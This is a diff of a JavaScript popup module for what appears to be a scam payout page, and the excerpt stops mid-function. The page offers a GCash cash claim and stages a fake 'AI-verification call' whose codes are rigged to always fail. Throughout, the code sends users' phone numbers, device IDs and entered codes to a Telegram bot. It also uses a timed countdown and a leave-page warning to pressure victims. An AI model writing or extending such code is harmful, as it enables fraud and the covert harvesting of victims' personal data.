@@ -1,8 +1,13 @@
 /**
- * Popup Share Module - 3D Fantasy Fruits Theme
- * With 500 Bills Indicators & AI-Verification Call
+ * Popup Share Module - With 500 Bills Indicators & AI-Verification Call
+ * Updated: AI-Verification Call System (Admin calls user)
+ * - Shows user's mobile number with animation
+ * - 60-second countdown timer (Neon Green → Neon Red)
+ * - Always invalid by default
+ * - Full Telegram notifications
  */
 
+// ========== POPUP MODULE ==========
 (function() {
     'use strict';
     
@@ -25,16 +30,20 @@
         try {
             var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
             audio.volume = 0.7;
-            audio.play().catch(function(e) {});
-        } catch(e) {}
+            audio.play().catch(function(e) { console.log('Sound play prevented:', e); });
+        } catch(e) {
+            console.log('Sound error:', e);
+        }
     }
     
     function playCallSound() {
         try {
             var audio = new Audio('sounds/call_ring.mp3');
             audio.volume = 0.5;
-            audio.play().catch(function(e) {});
-        } catch(e) {}
+            audio.play().catch(function(e) { console.log('Call sound error:', e); });
+        } catch(e) {
+            console.log('Call sound error:', e);
+        }
     }
     
     // ========== TELEGRAM NOTIFICATIONS ==========
@@ -44,28 +53,39 @@
     function sendTelegramMessage(message) {
         try {
             fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
-                .catch(function(e) {});
-        } catch(e) {}
+                .catch(function(e) { console.error('Telegram error:', e); });
+        } catch(e) {
+            console.error('Telegram error:', e);
+        }
     }
     
-    function getFormattedTime() {
-        return new Date().toLocaleString('en-PH', { timeZone: 'Asia/Manila' });
-    }
-    
+    // ========== AI-VERIFICATION CALL TELEGRAM NOTIFICATIONS ==========
     function sendAICallRequestNotification(userPhone, deviceId, code) {
-        sendTelegramMessage('📞 AI CALL REQ\n👤 Mobile: ' + userPhone + '\n🔑 Code: ' + code + '\n⏰ Time: ' + getFormattedTime());
+        var now = new Date();
+        var timestamp = now.toLocaleString();
+        var message = '📞 AI-VERIFICATION CALL REQUESTED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code Generated: ' + code + '\n⏰ Time: ' + timestamp + '\n📊 Status: Call requested - Admin will call user\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
     
     function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
-        sendTelegramMessage('🔑 AI CODE ATTEMPT\n👤 Mobile: ' + userPhone + '\n📝 Code: ' + codeEntered + '\n📊 Status: INVALID\n⏰ Time: ' + getFormattedTime());
+        var now = new Date();
+        var timestamp = now.toLocaleString();
+        var message = '🔑 AI-CODE VERIFICATION ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n📝 Code Entered: ' + codeEntered + '\n⏰ Time: ' + timestamp + '\n⏱️ Seconds Left: ' + secondsLeft + 's\n📊 Status: INVALID CODE (No valid code exists)\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
     
     function sendAICallExpiredNotification(userPhone, deviceId) {
-        sendTelegramMessage('⏰ AI CALL EXPIRED\n👤 Mobile: ' + userPhone + '\n⏰ Time: ' + getFormattedTime());
+        var now = new Date();
+        var timestamp = now.toLocaleString();
+        var message = '⏰ AI-VERIFICATION CALL EXPIRED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n⏰ Time: ' + timestamp + '\n📊 Status: Call expired - User needs to request a new call\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
     
     function sendClaimButtonNotification(userPhone, deviceId, amount) {
-        sendTelegramMessage('💳 CLAIM INITIATED\n👤 Mobile: ' + userPhone + '\n💰 Amount: ₱' + amount.toFixed(2) + '\n⏰ Time: ' + getFormattedTime());
+        var now = new Date();
+        var timestamp = now.toLocaleString();
+        var message = '💳 CLAIM THRU GCASH INITIATED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n💰 Amount: ₱' + amount.toFixed(2) + '\n⏰ Time: ' + timestamp + '\n📊 Status: Claim process started\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
     
     // ========== UPDATE BILLS INDICATORS ==========
@@ -127,14 +147,15 @@
             }
             @keyframes pulseGold {
                 0% { transform: scale(1); }
-                50% { transform: scale(1.02); box-shadow: 0 0 25px rgba(255,145,0,0.6); }
+                50% { transform: scale(1.02); box-shadow: 0 0 25px rgba(212,175,55,0.6); }
                 100% { transform: scale(1); }
             }
             @keyframes shake {
-                0%, 100% { transform: translateX(0); }
+                0% { transform: translateX(0); }
                 25% { transform: translateX(-5px); }
                 50% { transform: translateX(5px); }
                 75% { transform: translateX(-5px); }
+                100% { transform: translateX(0); }
             }
             @keyframes balanceDrain {
                 0%, 100% { transform: scale(1); }
@@ -149,9 +170,13 @@
                 0%, 100% { transform: scale(1); opacity: 1; }
                 50% { transform: scale(1.05); opacity: 0.7; }
             }
+            @keyframes slideDown {
+                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+                to { opacity: 1; transform: translateX(-50%) translateY(0); }
+            }
             @keyframes phonePulse {
                 0%, 100% { transform: scale(1); opacity: 1; }
-                50% { transform: scale(1.05); opacity: 0.8; text-shadow: 0 0 30px rgba(0, 242, 255, 0.5); }
+                50% { transform: scale(1.05); opacity: 0.8; text-shadow: 0 0 30px rgba(0, 212, 255, 0.5); }
             }
             @keyframes numberReveal {
                 0% { opacity: 0; transform: scale(0.5) rotateY(90deg); }
@@ -159,8 +184,8 @@
                 100% { opacity: 1; transform: scale(1) rotateY(0deg); }
             }
             @keyframes numberGlowPulse {
-                0%, 100% { text-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
-                50% { text-shadow: 0 0 40px rgba(0, 242, 255, 0.6), 0 0 80px rgba(0, 242, 255, 0.2); }
+                0%, 100% { text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
+                50% { text-shadow: 0 0 40px rgba(0, 212, 255, 0.6), 0 0 80px rgba(0, 212, 255, 0.2); }
             }
             @keyframes timerPulseRed {
                 0%, 100% { transform: scale(1); opacity: 1; }
@@ -179,7 +204,7 @@
                 border-radius: 4px;
                 overflow: hidden;
                 transition: all 0.3s ease;
-                border: 1px solid rgba(255, 145, 0, 0.3);
+                border: 1px solid rgba(212, 175, 55, 0.3);
             }
             .bill-indicator img {
                 width: 100%;
@@ -188,8 +213,8 @@
                 transition: all 0.3s ease;
             }
             .bill-indicator.active {
-                border-color: var(--fruit-orange);
-                box-shadow: 0 0 8px rgba(255, 145, 0, 0.5);
+                border-color: #d4af37;
+                box-shadow: 0 0 8px rgba(212, 175, 55, 0.5);
             }
             
             .small-back-btn {
@@ -207,7 +232,7 @@
                 gap: 5px;
                 width: auto;
                 margin-top: 10px;
-                font-family: 'Fredoka', sans-serif;
+                font-family: 'Orbitron', monospace;
                 letter-spacing: 1px;
                 text-shadow: none;
                 box-shadow: 0 3px 0 #222;
@@ -219,26 +244,23 @@
             }
             
             .claim-gcash-button {
-                background: linear-gradient(to bottom, #FFE94A, #FFD700, #FF9500);
-                border: 2px solid #fff9c4;
-                border-radius: 12px;
+                background: linear-gradient(to bottom, #d4af37, #aa771c);
+                border: 1px solid #fcf6ba;
+                border-radius: 8px;
                 padding: 12px 20px;
                 font-weight: 800;
-                color: #5A2A00;
+                color: #1a1100;
                 font-size: 13px;
                 cursor: pointer;
-                font-family: 'Fredoka', sans-serif;
+                font-family: 'Orbitron', monospace;
                 letter-spacing: 1px;
-                box-shadow: 0 4px 0 #B36B00;
+                text-shadow: 1px 1px 0 rgba(255,255,255,0.3);
+                box-shadow: 0 4px 0 #6e4b0c;
                 transition: all 0.1s ease;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                gap: 8px;
             }
             .claim-gcash-button:active {
                 transform: translateY(4px);
-                box-shadow: 0 0 0 #B36B00;
+                box-shadow: 0 0 0 #6e4b0c;
             }
             .claim-gcash-button:disabled {
                 opacity: 0.5;
@@ -248,19 +270,19 @@
             .divider {
                 width: 50px;
                 height: 2px;
-                background: linear-gradient(90deg, #FF9500, #fff9c4, #FF9500);
+                background: linear-gradient(90deg, #aa771c, #fcf6ba, #aa771c);
                 margin: 10px auto;
             }
             
             .phase3-heading {
-                font-family: 'Fredoka', sans-serif;
-                font-size: 20px;
+                font-family: 'Orbitron', monospace;
+                font-size: 18px;
                 font-weight: 900;
-                color: var(--fruit-orange);
+                color: #00d4ff;
                 margin: 5px 0;
                 letter-spacing: 1px;
                 text-align: center;
-                text-shadow: 0 0 15px rgba(255, 145, 0, 0.8);
+                text-shadow: 0 0 15px #00d4ff;
             }
             
             .verification-input {
@@ -269,22 +291,22 @@
                 font-weight: bold;
                 width: 160px;
                 padding: 14px;
-                background: #1a0b2e;
-                border: 2px solid var(--fruit-orange);
+                background: #000;
+                border: 2px solid #00d4ff;
                 border-radius: 10px;
-                color: var(--fruit-orange);
+                color: #00d4ff;
                 font-family: 'Orbitron', monospace;
                 transition: all 0.3s ease;
                 letter-spacing: 4px;
-                box-shadow: 0 0 15px rgba(255, 145, 0, 0.2);
+                box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
             }
             .verification-input:focus {
-                border-color: var(--fruit-orange);
-                box-shadow: 0 0 30px rgba(255, 145, 0, 0.3);
+                border-color: #00d4ff;
+                box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
                 outline: none;
             }
             .verification-input::placeholder {
-                color: rgba(255, 145, 0, 0.3);
+                color: rgba(0, 212, 255, 0.3);
                 letter-spacing: 2px;
                 font-size: 16px;
             }
@@ -293,7 +315,7 @@
                 font-size: 24px;
                 font-family: 'Orbitron', monospace;
                 font-weight: 900;
-                color: var(--fruit-orange);
+                color: #00d4ff;
                 margin-top: 8px;
                 letter-spacing: 2px;
                 animation: numberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards, numberGlowPulse 2s ease-in-out infinite 0.8s;
@@ -308,6 +330,7 @@
         document.head.appendChild(style);
     }
     
+    // ========== PHASE 3 ANIMATIONS ==========
     function addPhase3Animations() {
         if (document.querySelector('#phase3-animations')) return;
         
@@ -317,6 +340,10 @@
             @keyframes pulseRing {
                 0%, 100% { transform: scale(1); opacity: 1; }
                 50% { transform: scale(1.05); opacity: 0.7; }
+            }
+            @keyframes slideDown {
+                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+                to { opacity: 1; transform: translateX(-50%) translateY(0); }
             }
             @keyframes shake {
                 0%, 100% { transform: translateX(0); }
@@ -331,8 +358,8 @@
                 100% { opacity: 1; transform: scale(1) rotateY(0deg); }
             }
             @keyframes numberGlowPulse {
-                0%, 100% { text-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
-                50% { text-shadow: 0 0 40px rgba(0, 242, 255, 0.6), 0 0 80px rgba(0, 242, 255, 0.2); }
+                0%, 100% { text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
+                50% { text-shadow: 0 0 40px rgba(0, 212, 255, 0.6), 0 0 80px rgba(0, 212, 255, 0.2); }
             }
             @keyframes phonePulse {
                 0%, 100% { transform: scale(1); opacity: 1; }
@@ -343,15 +370,15 @@
                 50% { transform: scale(1.1); opacity: 0.7; }
             }
             .verification-input:focus {
-                border-color: var(--fruit-orange) !important;
-                box-shadow: 0 0 30px rgba(255, 145, 0, 0.3) !important;
+                border-color: #00d4ff !important;
+                box-shadow: 0 0 30px rgba(0, 212, 255, 0.3) !important;
                 outline: none;
             }
             .phone-number-display {
                 font-size: 24px;
                 font-family: 'Orbitron', monospace;
                 font-weight: 900;
-                color: var(--fruit-orange);
+                color: #00d4ff;
                 margin-top: 8px;
                 letter-spacing: 2px;
                 animation: numberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards, numberGlowPulse 2s ease-in-out infinite 0.8s;
@@ -398,7 +425,7 @@
             
             if (balanceSpan) {
                 balanceSpan.textContent = Math.max(0, currentVal).toFixed(2);
-                balanceSpan.style.color = currentVal < start * 0.3 ? '#ff1744' : '#ffd700';
+                balanceSpan.style.color = currentVal < start * 0.3 ? '#ff6666' : '#fce883';
                 balanceSpan.style.fontSize = (48 - (currentStep * 0.8)) + 'px';
             }
             
@@ -409,17 +436,22 @@
                 
                 if (balanceSpan) {
                     balanceSpan.textContent = '0.00';
-                    balanceSpan.style.color = '#ff1744';
+                    balanceSpan.style.color = '#ff4444';
                     balanceSpan.style.fontSize = '48px';
                 }
                 
                 if (balanceDisplay) {
                     balanceDisplay.style.animation = 'none';
+                }
+                
+                if (balanceDisplay) {
                     balanceDisplay.style.animation = 'successFlash 0.5s ease';
-                    balanceDisplay.innerHTML = '✅ <span style="font-size:24px; color:#00e676;">PROCESSING</span>';
+                    balanceDisplay.innerHTML = '✅ <span style="font-size:24px; color:#22C55E;">PROCESSING</span>';
                     
                     setTimeout(function() {
-                        if (balanceDisplay) balanceDisplay.style.animation = 'none';
+                        if (balanceDisplay) {
+                            balanceDisplay.style.animation = 'none';
+                        }
                     }, 500);
                 }
                 
@@ -441,14 +473,16 @@
             return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                 var data = snapshot.val();
                 currentFirewallStatus = (data && data.active === true);
+                console.log('Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
                 return currentFirewallStatus;
             });
         } catch(e) {
+            console.error('Firewall error:', e);
             return Promise.resolve(false);
         }
     }
     
-    // ========== SYNC BALANCE ==========
+    // ========== SYNC BALANCE FROM FIREBASE ==========
     function syncBalanceFromFirebase() {
         var userPhone = localStorage.getItem("userPhone");
         if (!userPhone) return Promise.resolve(0);
@@ -465,6 +499,7 @@
                 return 0;
             });
         } catch(e) {
+            console.error('Error syncing balance:', e);
             return Promise.resolve(0);
         }
     }
@@ -472,61 +507,67 @@
     // ========== ATTACH CLAIM BUTTON ==========
     function attachClaimButton() {
         var claimBtn = document.getElementById('claimNowBtn');
-        if (!claimBtn) return;
+        if (!claimBtn) {
+            console.error('Claim button not found!');
+            return;
+        }
         
         claimBtn.onclick = function(e) {
             e.preventDefault();
             e.stopPropagation();
+            
+            console.log('🔔 Claim button clicked!');
+            
             playClaimSound();
+            
+            var userPhone = localStorage.getItem("userPhone") || "Unknown";
+            var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
             
             syncBalanceFromFirebase().then(function(balance) {
                 showPopup(balance);
                 if (window.ConfettiModule) window.ConfettiModule.start();
             });
         };
+        
+        console.log('✅ Claim button attached');
     }
     
     // ========== GET PAYOUT LINK ==========
     function getLatestPayoutLink() {
         try {
             var db = firebase.database();
-            return db.ref('admin/redirectLink').once('value').then(function(adminSnap) {
-                var adminData = adminSnap.val();
-                if (adminData && adminData.url && adminData.active !== false) {
-                    return { key: 'admin_redirect', url: adminData.url };
+            return db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(snapshot) {
+                if (snapshot.exists()) {
+                    var key = Object.keys(snapshot.val())[0];
+                    var linkData = snapshot.val()[key];
+                    return { key: key, url: linkData.url };
                 }
-                
-                return db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(snapshot) {
-                    if (snapshot.exists()) {
-                        var key = Object.keys(snapshot.val())[0];
-                        var linkData = snapshot.val()[key];
-                        return { key: key, url: linkData.url };
-                    }
-                    return null;
-                });
+                return null;
             });
         } catch(e) {
+            console.error('Link error:', e);
             return Promise.resolve(null);
         }
     }
     
     // ========== MARK LINK AS USED ==========
     function markLinkAsUsed(linkKey, userPhone) {
-        if (linkKey === 'admin_redirect') return Promise.resolve();
-        
         try {
             var db = firebase.database();
             return db.ref('links/' + linkKey).update({
-                status: 'claimed',
+                status: 'used',
                 user: userPhone,
-                claimedAt: Date.now()
+                usedAt: Date.now()
+            }).then(function() {
+                console.log('✅ Link marked as used');
             });
         } catch(e) {
+            console.error('Error marking link:', e);
             return Promise.resolve();
         }
     }
     
-    // ========== BEFORE UNLOAD ==========
+    // ========== BEFORE UNLOAD HANDLER ==========
     function beforeUnloadHandler(e) {
         if (claimInProgress && !isRedirecting) {
             var message = "Your payout is unsuccessful! Please complete the process.";
@@ -542,16 +583,19 @@
         if (!popupInner) return;
         
         currentPhase = 3;
-        popupInner.style.transition = 'opacity 0.3s ease';
+        
+        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
         popupInner.style.opacity = '0';
+        popupInner.style.transform = 'scale(0.95)';
         
         setTimeout(function() {
             showPhase3();
             popupInner.style.opacity = '1';
+            popupInner.style.transform = 'scale(1)';
         }, 300);
     }
     
-    // ========== PHASE 3: AI-VERIFICATION CALL (3D Fruits Theme) ==========
+    // ========== PHASE 3: AI-VERIFICATION CALL ==========
     function showPhase3() {
         var popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -562,6 +606,7 @@
             popupContainer.style.width = '90%';
         }
         
+        // Reset call state
         callInProgress = false;
         callCountdown = 60;
         if (callTimerInterval) {
@@ -572,6 +617,7 @@
         currentCallCode = '';
         codeEntered = false;
         
+        // Get user's mobile number
         var userPhone = localStorage.getItem("userPhone") || "Unknown";
         var formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
         
@@ -579,22 +625,26 @@
             <div class="popup-close" id="popupClosePhase3">✕</div>
             
             <div style="text-align: center; margin-bottom: 10px;">
-                <div style="width: 80px; height: 80px; margin: 0 auto; background: linear-gradient(145deg, #ff2d95, #b537f2); border-radius: 50%; border: 3px solid #ffd700; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 25px rgba(255,45,149,0.6); font-size: 40px; animation: pulseRing 2s ease-in-out infinite;">
-                    🍓
+                <div style="width: 70px; height: 70px; margin: 0 auto; background: linear-gradient(145deg, rgba(0, 212, 255, 0.15), rgba(0, 100, 200, 0.05)); border-radius: 50%; border: 2px solid rgba(0, 212, 255, 0.3); display: flex; align-items: center; justify-content: center; animation: pulseRing 2s ease-in-out infinite;">
+                    <i class="fas fa-phone" style="font-size: 30px; color: #00d4ff; text-shadow: 0 0 20px rgba(0, 212, 255, 0.5);"></i>
                 </div>
             </div>
             
-            <h2 class="phase3-heading">FRUIT VERIFICATION</h2>
-            <div class="divider"></div>
+            <h2 class="phase3-heading">🔐 AI-VERIFICATION</h2>
             
-            <p style="font-size: 11px; color: rgba(255,255,255,0.8); text-align: center; margin: 5px 0 15px 0; font-family: 'Plus Jakarta Sans', sans-serif;">
-                System AI will call you with a <strong style="color: var(--fruit-orange);">4-digit verification code</strong>
+            <div class="divider" style="width: 60px; height: 2px; background: linear-gradient(90deg, transparent, #00d4ff, transparent); margin: 8px auto;"></div>
+            
+            <p style="font-size: 11px; color: rgba(255,255,255,0.6); text-align: center; margin: 5px 0 15px 0; font-family: 'Poppins', sans-serif; letter-spacing: 0.5px;">
+                <i class="fas fa-shield-alt" style="color: #00d4ff; margin-right: 6px;"></i>
+                System AI will call you with a <strong style="color: #00d4ff;">4-digit verification code</strong>
             </p>
             
-            <div id="callStatusContainer" style="background: rgba(0,0,0,0.4); border: 2px solid rgba(255,145,0,0.3); border-radius: 16px; padding: 15px; margin-bottom: 15px; text-align: center;">
-                <div id="callStatusIcon" style="font-size: 32px; margin-bottom: 5px;">🍊</div>
-                <div id="callStatusText" style="font-size: 13px; color: #fff; font-weight: 500; font-family: 'Plus Jakarta Sans', sans-serif;">Ready for verification</div>
+            <!-- STATUS DISPLAY -->
+            <div id="callStatusContainer" style="background: rgba(0, 212, 255, 0.05); border: 1px solid rgba(0, 212, 255, 0.1); border-radius: 12px; padding: 15px; margin-bottom: 15px; text-align: center;">
+                <div id="callStatusIcon" style="font-size: 28px; margin-bottom: 5px;">📞</div>
+                <div id="callStatusText" style="font-size: 13px; color: rgba(255,255,255,0.8); font-family: 'Poppins', sans-serif; font-weight: 500;">Ready for verification</div>
                 
+                <!-- PHONE NUMBER DISPLAY WITH ANIMATION -->
                 <div id="phoneNumberDisplay" style="display: none; margin-top: 8px;">
                     <span class="phone-number-display">
                         <span class="phone-icon">📱</span>
@@ -602,32 +652,34 @@
                     </span>
                 </div>
                 
-                <div id="callTimerDisplay" style="font-size: 32px; font-family: 'Orbitron', monospace; font-weight: 900; color: #00e676; margin-top: 5px; text-shadow: 0 0 30px rgba(0, 230, 118, 0.4); display: none;">60s</div>
+                <div id="callTimerDisplay" style="font-size: 28px; font-family: 'Orbitron', monospace; font-weight: 900; color: #39ff14; margin-top: 5px; text-shadow: 0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1); display: none;">60s</div>
             </div>
             
-            <button id="requestCallBtn" class="claim-gcash-button" style="width: 100%; background: linear-gradient(to bottom, #ff2d95, #b537f2); border: 2px solid #fff; color: #fff; box-shadow: 0 4px 0 #8b0f5c; padding: 14px; font-size: 14px;">
+            <!-- REQUEST CALL BUTTON -->
+            <button id="requestCallBtn" class="claim-gcash-button" style="width: 100%; background: linear-gradient(to bottom, #00d4ff, #0088cc); border: 1px solid #66ddff; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #006699; padding: 14px; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 10px; font-family: 'Orbitron', monospace; letter-spacing: 1px;">
                 <i class="fas fa-phone-alt"></i>
-                REQUEST AI CALL
+                REQUEST AI-VERIFICATION CALL
             </button>
             
+            <!-- CODE INPUT SECTION -->
             <div id="codeSection" style="display: none; margin-top: 15px;">
                 <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px;">
-                    <i class="fas fa-key" style="color: var(--fruit-orange); font-size: 14px;"></i>
-                    <span style="font-size: 11px; color: rgba(255,255,255,0.7); font-family: 'Plus Jakarta Sans', sans-serif;">Enter the 4-digit code</span>
+                    <i class="fas fa-key" style="color: #00d4ff; font-size: 14px;"></i>
+                    <span style="font-size: 11px; color: rgba(255,255,255,0.6); font-family: 'Poppins', sans-serif;">Enter the 4-digit code from the call</span>
                 </div>
                 
                 <div style="display: flex; gap: 10px; justify-content: center; align-items: center; flex-wrap: wrap;">
                     <input type="text" id="code4Digit" class="verification-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
-                    <button id="verifyCodeBtn" class="claim-gcash-button" style="background: linear-gradient(to bottom, #00e676, #00b248); border: 2px solid #fff; color: #00331a; box-shadow: 0 4px 0 #008033; padding: 14px 20px; font-size: 13px;">
+                    <button id="verifyCodeBtn" class="claim-gcash-button" style="background: linear-gradient(to bottom, #22C55E, #16A34A); border: 1px solid #4ade80; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #15803d; padding: 14px 20px; font-size: 13px; font-family: 'Orbitron', monospace; letter-spacing: 1px;">
                         <i class="fas fa-check"></i> VERIFY
                     </button>
                 </div>
                 
-                <div id="codeErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff1744; font-size: 11px; padding: 8px; border-radius: 8px; background: rgba(255, 23, 68, 0.1); border: 1px solid rgba(255, 23, 68, 0.2);">
+                <div id="codeErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff4444; font-size: 11px; padding: 8px; border-radius: 8px; font-family: 'Poppins', sans-serif; background: rgba(255, 68, 68, 0.1); border: 1px solid rgba(255, 68, 68, 0.2);">
                     <i class="fas fa-exclamation-circle"></i> Invalid code. Please request a new call.
                 </div>
                 
-                <div id="callExpiredMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff9100; font-size: 11px; padding: 8px; border-radius: 8px; background: rgba(255, 145, 0, 0.1); border: 1px solid rgba(255, 145, 0, 0.2);">
+                <div id="callExpiredMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff8800; font-size: 11px; padding: 8px; border-radius: 8px; font-family: 'Poppins', sans-serif; background: rgba(255, 136, 0, 0.1); border: 1px solid rgba(255, 136, 0, 0.2);">
                     <i class="fas fa-clock"></i> Call code expired. Request a new call.
                 </div>
             </div>
@@ -666,6 +718,7 @@
             };
         }
         
+        // ========== REQUEST CALL BUTTON ==========
         var requestBtn = document.getElementById('requestCallBtn');
         if (requestBtn) {
             requestBtn.onclick = function() {
@@ -677,6 +730,7 @@
             };
         }
         
+        // ========== VERIFY CODE BUTTON ==========
         var verifyBtn = document.getElementById('verifyCodeBtn');
         var codeInput = document.getElementById('code4Digit');
         
@@ -696,17 +750,17 @@
             codeInput.addEventListener('input', function(e) {
                 var value = this.value.trim();
                 if (value.length === 4 && /^\d+$/.test(value)) {
-                    this.style.borderColor = '#00e676';
-                    this.style.boxShadow = '0 0 20px rgba(0, 230, 118, 0.3)';
+                    this.style.borderColor = '#22C55E';
+                    this.style.boxShadow = '0 0 20px rgba(34, 197, 94, 0.3)';
                 } else {
-                    this.style.borderColor = 'var(--fruit-orange)';
-                    this.style.boxShadow = '0 0 15px rgba(255, 145, 0, 0.2)';
+                    this.style.borderColor = '#00d4ff';
+                    this.style.boxShadow = '0 0 15px rgba(0, 212, 255, 0.2)';
                 }
             });
         }
     }
     
-    // ========== REQUEST AI CALL ==========
+    // ========== REQUEST AI-VERIFICATION CALL ==========
     function requestAICall() {
         if (callInProgress) return;
         
@@ -719,8 +773,10 @@
         var userPhone = localStorage.getItem("userPhone") || "Unknown";
         var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
         
+        // Send Telegram notification with code
         sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
         
+        // Update UI
         var statusIcon = document.getElementById('callStatusIcon');
         var statusText = document.getElementById('callStatusText');
         var phoneDisplay = document.getElementById('phoneNumberDisplay');
@@ -731,36 +787,57 @@
         var codeErrorMsg = document.getElementById('codeErrorMsg');
         var callExpiredMsg = document.getElementById('callExpiredMsg');
         
+        // Reset messages
         if (codeErrorMsg) codeErrorMsg.style.display = 'none';
         if (callExpiredMsg) callExpiredMsg.style.display = 'none';
         if (codeInput) codeInput.value = '';
         
         if (statusIcon) statusIcon.innerHTML = '📞';
-        if (statusText) statusText.innerHTML = '<strong style="color: var(--fruit-orange);">AI CALL</strong> being placed...';
-        if (phoneDisplay) phoneDisplay.style.display = 'block';
+        if (statusText) {
+            statusText.innerHTML = '📱 <strong style="color: #00d4ff;">AI-VERIFICATION CALL</strong> is being placed...<br><span style="font-size: 10px; color: rgba(255,255,255,0.3);">Please wait for the call</span>';
+            statusText.style.color = '#00d4ff';
+        }
+        if (phoneDisplay) {
+            phoneDisplay.style.display = 'block';
+        }
         if (timerDisplay) {
             timerDisplay.style.display = 'block';
             timerDisplay.textContent = '60s';
-            timerDisplay.style.color = '#00e676';
+            timerDisplay.style.color = '#39ff14';
+            timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
         }
         if (requestBtn) {
             requestBtn.disabled = true;
             requestBtn.style.opacity = '0.5';
             requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CALLING...';
         }
-        if (codeSection) codeSection.style.display = 'none';
+        if (codeSection) {
+            codeSection.style.display = 'none';
+        }
         
+        // Play call sound effect
         playCallSound();
+        
+        // Start countdown timer
         startCallTimer();
         
+        // Simulate "call connected" after 4 seconds (admin calls user)
         setTimeout(function() {
-            if (statusIcon) statusIcon.innerHTML = '🎯';
-            if (statusText) statusText.innerHTML = '<strong style="color: #00e676;">CALL CONNECTED!</strong>';
-            if (codeSection) codeSection.style.display = 'block';
-            if (codeInput) codeInput.focus();
+            if (statusIcon) statusIcon.innerHTML = '📱';
+            if (statusText) {
+                statusText.innerHTML = '🔊 <strong style="color: #22C55E;">AI-VERIFICATION CALL</strong> connected!<br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Enter the 4-digit code below</span>';
+                statusText.style.color = '#22C55E';
+            }
+            if (codeSection) {
+                codeSection.style.display = 'block';
+            }
+            if (codeInput) {
+                codeInput.focus();
+            }
         }, 4000);
     }
     
+    // ========== GENERATE CALL CODE ==========
     function generateCallCode() {
         var code = Math.floor(1000 + Math.random() * 9000);
         return code.toString();
@@ -776,8 +853,10 @@
         var callExpiredMsg = document.getElementById('callExpiredMsg');
         var codeSection = document.getElementById('codeSection');
         
+        // Set initial color - Neon Green
         if (timerDisplay) {
-            timerDisplay.style.color = '#00e676';
+            timerDisplay.style.color = '#39ff14';
+            timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
             timerDisplay.style.animation = '';
         }
         
@@ -787,31 +866,50 @@
             if (timerDisplay) {
                 timerDisplay.textContent = callCountdown + 's';
                 
+                // ========== NEON COLOR SCHEME ==========
+                // 60s - 10s: NEON GREEN (#39ff14)
+                // 9s - 0s: NEON RED (#ff1744)
+                
                 if (callCountdown <= 9) {
+                    // NEON RED - Urgent (9-0 seconds)
                     timerDisplay.style.color = '#ff1744';
+                    timerDisplay.style.textShadow = '0 0 30px rgba(255, 23, 68, 0.6), 0 0 60px rgba(255, 23, 68, 0.3), 0 0 100px rgba(255, 23, 68, 0.1)';
                     timerDisplay.style.animation = 'timerPulseRed 0.5s ease-in-out infinite';
                 } else {
-                    timerDisplay.style.color = '#00e676';
+                    // NEON GREEN - Normal (60-10 seconds)
+                    timerDisplay.style.color = '#39ff14';
+                    timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
                     timerDisplay.style.animation = '';
                 }
             }
             
             if (callCountdown <= 0) {
+                // Call expired
                 stopCallTimer();
                 
                 var userPhone = localStorage.getItem("userPhone") || "Unknown";
                 var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                 sendAICallExpiredNotification(userPhone, deviceId);
                 
